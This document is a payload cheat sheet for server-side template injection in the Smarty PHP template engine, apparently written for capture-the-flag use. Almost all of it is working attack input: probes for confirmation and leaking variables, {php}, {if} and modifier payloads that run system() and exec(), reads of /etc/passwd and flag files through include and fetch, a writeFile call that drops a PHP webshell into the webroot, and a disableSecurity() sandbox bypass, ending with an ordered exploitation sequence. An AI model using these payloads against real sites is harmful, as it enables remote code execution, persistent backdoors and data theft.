# Smarty — PHP template engine

Marker: `{$x=7*7}{$x}` or `{7*7}` (math in `{...}` directly).
Smarty runs PHP-side — escapes reach `system()`/`eval()`/`include`.

---

## 1. Confirm

```smarty
{7*7}                → 49        -- math directly in braces
{$smarty.version}    → version leak — 3.x/4.x
{$smarty.template}   → template name
{$smarty.current_dir}
{$smarty.server.DOCUMENT_ROOT}
{$smarty.const.FLAG}  -- PHP constants — the flag path!
{$smarty.session}     -- $_SESSION
{$smarty.get.x}       -- $_GET
{$smarty.post.x}      -- $_POST
{$smarty.cookies.x}   -- $_COOKIE
{$smarty.request.x}
{$smarty.env.PATH}    -- $_ENV
```

`$smarty.const.*` reads PHP constants — flag often `define()`d.

---

## 2. The php-tag path — `{php}`/`{literal}`

```smarty
{php}echo `id`;{/php}            -- {php} tag — REMOVED in Smarty 3.1+
                                  (moved to SmartyBC compat)
{php}system('id');{/php}
{php}echo file_get_contents('/flag');{/php}
{literal}<script>alert(1)</script>{/literal}   -- XSS not RCE
```

`{php}` availability is version-and-config dependent — Smarty 3.1+
needs `SmartyBC` class. Try it; if dropped, next paths.

---

## 3. The `{if}`/`{eval}`/`{include}` paths

```smarty
{if phpinfo()}{/if}                -- arbitrary php in if-cond —
                                    older Smarty allowed php calls
{if system('id')}{/if}
{eval var='{php}phpinfo(){/php}'}  -- eval tag — runs the string
{include file='/etc/passwd'}        -- include — file leaks via error
{include file='/etc/passwd' assign=x}{$x}
{fetch file='/etc/passwd'}
```

`{include}` of a non-template file leaks via parse error or dumps
content — file-read primitive.

---

## 4. The `|` modifier gadget — `{x|modifier:arg}`

```smarty
{'x'|system:'id'}                  -- call system via modifier? —
                                    modifiers take (value,args):
                                    modifier must BE a registered
                                    callable — 'system' as modifier
                                    if php-functions-as-modifiers on
{$x|file_put_contents:'/tmp/x'}
{'id'|exec}
{'id'|system}
{'cat /flag'|exec:$out}{$out}
```

Smarty allows PHP function names as modifiers when
`security` is off — `|system`, `|exec`, `|passthru` reach RCE.

---

## 5. `{function}`/`{block}`/`{capture}` — deferred-exec blocks

```smarty
{function name=f}{php}system('id');{/php}{/function}
   -- function def — need {call} to fire — or inline-call
{capture}{/capture}
```

---

## 6. Static-class access — `::` callables

```smarty
{Smarty_Internal_Runtime_WriteFile::writeFile('/tmp/x.php','<?php system($_GET[c]);',null)}
   -- Smarty 3.x internal class static call — WRITE A SHELL!
{Smarty_Internal_Write_File::writeFile('/var/www/html/x.php','<?php system($_GET[c]);')}
   -- version-dependent class names — both variants exist
```

The writeFile chain — writes a PHP webshell into webroot → then
`GET /x.php?c=id`. The known Smarty 3.x RCE path.

---

## 7. `$smarty.template_object` chain — parent access

```smarty
{$smarty.template_object->smarty}
{$smarty.template_object->smarty->security}
{$smarty.template_object->smarty->disableSecurity()}
   -- disables sandbox → then {php} works
```

`disableSecurity` — if the method is reachable from the template
context, it turns off the sandbox → all paths open.

---

## 8. The stream-wrapper file-read

```smarty
{include file='file:///etc/passwd'}
{fetch file='file:///etc/passwd'}
{$smarty.fetch}
{$x=file_get_contents('/flag')}{$x}   -- if php-calls allowed
{file_get_contents('/flag')}          -- bare call
```

---

## 9. The test sequence

```smarty
{7*7}                                   -- confirm eval
{$smarty.version}                        -- version
{$smarty.const.FLAG}                     -- constants — flag check first!
{php}system('id');{/php}                  -- {php} tag
{if system('id')}{/if}                    -- php-in-if
{'id'|system}                             -- modifier-callable
{Smarty_Internal_Runtime_WriteFile::writeFile('/var/www/html/s.php','<?=system($_GET[c]);',null)}
{include file='/etc/passwd'}              -- file-read
{$smarty.template_object->smarty->disableSecurity()}{php}system('id'){/php}
```
